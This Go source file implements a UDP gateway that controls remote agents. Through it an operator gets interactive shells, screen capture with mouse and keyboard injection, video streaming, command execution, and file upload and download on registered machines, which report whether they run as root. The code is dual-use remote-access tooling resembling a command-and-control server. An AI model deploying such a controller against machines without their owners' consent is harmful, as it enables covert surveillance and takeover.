package main

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"sync/atomic"
)

// UDPGateway handles inbound and outbound UDP communication with agents
type UDPGateway struct {
	conn       *net.UDPConn
	nm         *NodeManager
	sessionSeq uint32
	stats      *ServerStats
}

// NewUDPGateway initializes a new UDP gateway
func NewUDPGateway(addr string, nm *NodeManager, stats *ServerStats) (*UDPGateway, error) {
	uaddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, err
	}

	conn, err := net.ListenUDP("udp", uaddr)
	if err != nil {
		return nil, err
	}

	return &UDPGateway{
		conn:       conn,
		nm:         nm,
		sessionSeq: 1000,
		stats:      stats,
	}, nil
}

// Start begins the UDP packet receive loop
func (gw *UDPGateway) Start() {
	buf := make([]byte, 65536)

	for {
		n, remoteAddr, err := gw.conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("[-] UDP read error: %v", err)
			continue
		}

		if n < HeaderSize {
			continue
		}

		gw.stats.InPackets.Add(1)
		gw.stats.InBytes.Add(int64(n))

		hdr, err := DecodeHeader(buf[:n])
		if err != nil {
			continue
		}

		payload := buf[HeaderSize:n]

		switch hdr.Type {
		case MsgRegister:
			var reg MsgRegisterPayload
			if len(payload) >= 192 {
				copy(reg.NodeID[:], payload[0:64])
				copy(reg.Hostname[:], payload[64:128])
				copy(reg.OSInfo[:], payload[128:192])
			}

			if len(payload) >= 196 {
				reg.ScreenW = binary.LittleEndian.Uint16(payload[192:194])
				reg.ScreenH = binary.LittleEndian.Uint16(payload[194:196])
			}

			nodeID := CStringToString(reg.NodeID[:])
			hostname := CStringToString(reg.Hostname[:])
			osInfo := CStringToString(reg.OSInfo[:])

			if nodeID == "" {
				nodeID = fmt.Sprintf("node-%s", remoteAddr.String())
			}

			isRoot := (hdr.Flags & 0x01) != 0
			node := gw.nm.RegisterOrUpdate(nodeID, hostname, osInfo, remoteAddr, isRoot)
			if reg.ScreenW > 0 && reg.ScreenH > 0 {
				node.mu.Lock()
				node.VncWidth = reg.ScreenW
				node.VncHeight = reg.ScreenH
				node.mu.Unlock()
			}

			// Send Heartbeat ACK
			ack := BuildPacket(MsgHeartbeat, hdr.SessionID, node.NextSeq(), nil)
			_, _ = gw.conn.WriteToUDP(ack, remoteAddr)

		case MsgHeartbeat:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if (hdr.Flags & 0x01) != 0 {
					node.mu.Lock()
					node.HasRoot = true
					node.mu.Unlock()
				}
				ack := BuildPacket(MsgHeartbeat, hdr.SessionID, node.NextSeq(), nil)
				_, _ = gw.conn.WriteToUDP(ack, remoteAddr)
			}

		case MsgPtyData:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) > 0 {
					node.BroadcastPTYSession(hdr.SessionID, payload)
				}
			}

		case MsgSessionClose:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				node.mu.Lock()
				if node.ActiveSessionID == hdr.SessionID {
					node.ActiveSessionID = 0
				}
				node.mu.Unlock()
				node.BroadcastPTYSession(hdr.SessionID, []byte("\r\n\x1b[33m[*] Remote session terminated by agent.\x1b[0m\r\n"))
			}

		case MsgVncStart:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				node.mu.Lock()
				node.VncActive = true
				if len(payload) >= 5 {
					node.VncWidth = binary.BigEndian.Uint16(payload[0:2])
					node.VncHeight = binary.BigEndian.Uint16(payload[2:4])
					node.VncBpp = payload[4]
				}
				node.mu.Unlock()
			}

		case MsgVncStop:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				node.mu.Lock()
				node.VncActive = false
				node.mu.Unlock()
			}

		case MsgVncData:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				node.BroadcastVNC(payload)
			}

		case MsgCmdOutput:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) >= 10 {
					reqID := binary.LittleEndian.Uint32(payload[0:4])
					exitCode := int32(binary.LittleEndian.Uint32(payload[4:8]))
					dLen := binary.LittleEndian.Uint16(payload[8:10])
					var p MsgCmdOutputPayload
					p.ReqID = reqID
					p.ExitCode = exitCode
					p.Len = dLen
					if int(dLen) <= len(payload)-10 {
						copy(p.Data[:], payload[10:10+dLen])
					}
					node.DispatchCmdOutput(p)
				}
			}

		case MsgFsListResp:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) >= 8 {
					reqID := binary.LittleEndian.Uint32(payload[0:4])
					count := binary.LittleEndian.Uint16(payload[5:7])
					entries := make([]FsEntry, 0, count)
					offset := 8
					entrySize := 1 + 4 + 8 + 256
					for i := 0; i < int(count) && offset+entrySize <= len(payload); i++ {
						var fe FsEntry
						fe.IsDir = payload[offset]
						fe.Mode = binary.LittleEndian.Uint32(payload[offset+1 : offset+5])
						fe.Size = binary.LittleEndian.Uint64(payload[offset+5 : offset+13])
						copy(fe.Name[:], payload[offset+13:offset+entrySize])
						entries = append(entries, fe)
						offset += entrySize
					}
					node.DispatchFsList(reqID, entries)
				}
			}

		case MsgFilePushEnd:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) >= 5 {
					transferID := binary.LittleEndian.Uint32(payload[0:4])
					status := payload[4]
					node.DispatchFilePushEnd(transferID, status)
				}
			}

		case MsgFilePullChunk:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) >= 14 {
					var p MsgFileChunkPayload
					p.TransferID = binary.LittleEndian.Uint32(payload[0:4])
					p.Offset = binary.LittleEndian.Uint64(payload[4:12])
					p.Len = binary.LittleEndian.Uint16(payload[12:14])
					if int(p.Len) <= len(payload)-14 {
						copy(p.Data[:], payload[14:14+p.Len])
					}
					node.DispatchFilePullChunk(p)
				}
			}

		case MsgFilePullEnd:
			if node := gw.nm.FindByAddr(remoteAddr); node != nil {
				gw.nm.Touch(node.ID, remoteAddr)
				if len(payload) >= 5 {
					transferID := binary.LittleEndian.Uint32(payload[0:4])
					var p MsgFileChunkPayload
					p.TransferID = transferID
					p.Len = 0 // EOF marker
					node.DispatchFilePullChunk(p)
				}
			}
		}
	}
}

// SendSessionOpen sends a command to spawn/attach PTY on the agent
func (gw *UDPGateway) SendSessionOpen(node *Node, cols, rows uint16) (uint32, error) {
	sessID := atomic.AddUint32(&gw.sessionSeq, 1)

	node.mu.Lock()
	node.ActiveSessionID = sessID
	node.Cols = cols
	node.Rows = rows
	udpAddr := node.udpAddr
	node.mu.Unlock()

	if udpAddr == nil {
		return 0, fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	payload := make([]byte, 4)
	binary.LittleEndian.PutUint16(payload[0:2], cols)
	binary.LittleEndian.PutUint16(payload[2:4], rows)

	pkt := BuildPacket(MsgSessionOpen, sessID, seq, payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return sessID, err
}

// SendPtyData sends terminal input bytes to the remote agent's active PTY
func (gw *UDPGateway) SendPtyData(node *Node, data []byte) error {
	node.mu.RLock()
	sessID := node.ActiveSessionID
	node.mu.RUnlock()
	return gw.SendPtyDataWithSession(node, sessID, data)
}

// SendPtyDataWithSession sends terminal input bytes to a specific session ID on the remote agent
func (gw *UDPGateway) SendPtyDataWithSession(node *Node, sessID uint32, data []byte) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	// Chunk data to fit into MaxPayloadSize
	for len(data) > 0 {
		chunkSize := len(data)
		if chunkSize > MaxPayloadSize {
			chunkSize = MaxPayloadSize
		}

		chunk := data[:chunkSize]
		data = data[chunkSize:]

		seq := node.NextSeq()
		pkt := BuildPacket(MsgPtyData, sessID, seq, chunk)

		_, err := gw.conn.WriteToUDP(pkt, udpAddr)
		if err != nil {
			return err
		}
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return nil
}

// SendPtyResize sends terminal window resize command for default session
func (gw *UDPGateway) SendPtyResize(node *Node, cols, rows uint16) error {
	node.mu.Lock()
	node.Cols = cols
	node.Rows = rows
	sessID := node.ActiveSessionID
	node.mu.Unlock()
	return gw.SendPtyResizeID(node, sessID, cols, rows)
}

// SendPtyResizeID sends terminal window resize command for a specific session ID
func (gw *UDPGateway) SendPtyResizeID(node *Node, sessID uint32, cols, rows uint16) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	payload := make([]byte, 4)
	binary.LittleEndian.PutUint16(payload[0:2], cols)
	binary.LittleEndian.PutUint16(payload[2:4], rows)

	pkt := BuildPacket(MsgPtyResize, sessID, seq, payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendSessionClose signals agent to detach the default active PTY session
func (gw *UDPGateway) SendSessionClose(node *Node) error {
	node.mu.Lock()
	sessID := node.ActiveSessionID
	node.ActiveSessionID = 0
	node.mu.Unlock()
	return gw.SendSessionCloseID(node, sessID)
}

// SendSessionCloseID signals agent to detach a specific PTY session by ID
func (gw *UDPGateway) SendSessionCloseID(node *Node, sessID uint32) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	pkt := BuildPacket(MsgSessionClose, sessID, seq, nil)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendVncStart sends command to start screen capture
func (gw *UDPGateway) SendVncStart(node *Node) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	pkt := BuildPacket(MsgVncStart, sessID, seq, nil)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendVncStop sends command to stop screen capture
func (gw *UDPGateway) SendVncStop(node *Node) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	pkt := BuildPacket(MsgVncStop, sessID, seq, nil)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendStreamStart sends command to start ultra-low-latency WebRTC/RTSP stream with default quality
func (gw *UDPGateway) SendStreamStart(node *Node, serverHost string, rtspPort uint16, streamName string) error {
	return gw.SendStreamStartExt(node, serverHost, rtspPort, streamName, 0, 0, 30, 2000, 0)
}

// SendStreamStartExt sends command to start ultra-low-latency WebRTC/RTSP stream with custom quality
func (gw *UDPGateway) SendStreamStartExt(node *Node, serverHost string, rtspPort uint16, streamName string, width, height, fps, bitrateKb uint16, preset uint8) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := EncodeStreamStart(serverHost, rtspPort, streamName, width, height, fps, bitrateKb, preset)
	seq := node.NextSeq()
	pkt := BuildPacket(MsgStreamStart, sessID, seq, payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendStreamStop sends command to stop stream transport
func (gw *UDPGateway) SendStreamStop(node *Node) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	pkt := BuildPacket(MsgStreamStop, sessID, seq, nil)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

// SendVncInput forwards mouse and keyboard events to agent
func (gw *UDPGateway) SendVncInput(node *Node, inp MsgVncInputPayload) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	seq := node.NextSeq()
	payload := make([]byte, 11)
	payload[0] = inp.EventType
	payload[1] = inp.ButtonMask
	binary.LittleEndian.PutUint16(payload[2:4], inp.X)
	binary.LittleEndian.PutUint16(payload[4:6], inp.Y)
	binary.LittleEndian.PutUint32(payload[6:10], inp.KeySym)
	payload[10] = inp.DownFlag

	pkt := BuildPacket(MsgVncInput, sessID, seq, payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	if err == nil {
		gw.stats.OutPackets.Add(1)
		gw.stats.OutBytes.Add(int64(len(pkt)))
	}
	return err
}

func (gw *UDPGateway) SendCmdExec(node *Node, reqID, timeoutSec uint32, cmd string) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 8+512)
	binary.LittleEndian.PutUint32(payload[0:4], reqID)
	binary.LittleEndian.PutUint32(payload[4:8], timeoutSec)
	copy(payload[8:8+512], []byte(cmd))

	pkt := BuildPacket(MsgCmdExec, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}

func (gw *UDPGateway) SendFsListReq(node *Node, reqID uint32, path string) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 4+512)
	binary.LittleEndian.PutUint32(payload[0:4], reqID)
	copy(payload[4:4+512], []byte(path))

	pkt := BuildPacket(MsgFsListReq, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}

func (gw *UDPGateway) SendFilePushStart(node *Node, transferID uint32, totalSize uint64, mode uint32, path string) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 4+8+4+512)
	binary.LittleEndian.PutUint32(payload[0:4], transferID)
	binary.LittleEndian.PutUint64(payload[4:12], totalSize)
	binary.LittleEndian.PutUint32(payload[12:16], mode)
	copy(payload[16:], []byte(path))

	pkt := BuildPacket(MsgFilePushStart, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}

func (gw *UDPGateway) SendFilePushChunk(node *Node, transferID uint32, offset uint64, data []byte) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 4+8+2+len(data))
	binary.LittleEndian.PutUint32(payload[0:4], transferID)
	binary.LittleEndian.PutUint64(payload[4:12], offset)
	binary.LittleEndian.PutUint16(payload[12:14], uint16(len(data)))
	copy(payload[14:], data)

	pkt := BuildPacket(MsgFilePushChunk, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}

func (gw *UDPGateway) SendFilePushEnd(node *Node, transferID uint32) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 5)
	binary.LittleEndian.PutUint32(payload[0:4], transferID)
	payload[4] = 0 // success

	pkt := BuildPacket(MsgFilePushEnd, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}

func (gw *UDPGateway) SendFilePullReq(node *Node, transferID uint32, path string) error {
	node.mu.RLock()
	udpAddr := node.udpAddr
	sessID := node.ActiveSessionID
	node.mu.RUnlock()

	if udpAddr == nil {
		return fmt.Errorf("node %s has no known address", node.ID)
	}

	payload := make([]byte, 4+512)
	binary.LittleEndian.PutUint32(payload[0:4], transferID)
	copy(payload[4:], []byte(path))

	pkt := BuildPacket(MsgFilePullReq, sessID, node.NextSeq(), payload)
	_, err := gw.conn.WriteToUDP(pkt, udpAddr)
	return err
}
